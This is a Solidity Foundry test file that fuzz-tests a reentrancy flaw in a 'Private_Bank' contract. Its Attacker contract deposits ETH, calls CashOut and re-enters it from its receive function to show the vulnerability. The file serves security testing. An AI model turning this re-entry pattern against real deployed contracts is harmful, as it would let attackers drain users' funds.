
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Private_Bank, Log} from "../src/Private_Bank.sol";

contract TestReentrancyPrivate_Bank is Test {
    
    Private_Bank public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new Private_Bank(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1 ether); // Must be greater than MinDeposit
        vm.assume(attackVal < type(uint128).max); // Avoid overflow

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required other than deployment

        // --- 3. Funding ---
        // Fund the Victim with enough ETH to cover the theft (reentrancy withdrawal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Test Contract so it can pass ETH to the Attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    
    Private_Bank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = Private_Bank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to establish a balance to withdraw later
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // --- 1. Capture Initial State ---
        initialSnapshot = address(this).balance;

        // --- 3. Call the vulnerable function ---
        // We use a low-level call here because in Solidity 0.8.x, the reentrancy will likely cause 
        // an underflow revert on the second balance update (Check-Effects-Interaction violation).
        // However, if we successfully re-entered, we have proven the vulnerability exists.
        (bool success, ) = address(victim).call(abi.encodeWithSignature("CashOut(uint256)", val));

        // --- 4. Verify Success Conditions ---
        // If we managed to enter the receive function recursively, attackCallCount will be > 1.
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.CashOut(msg.value);
        }
    }
}
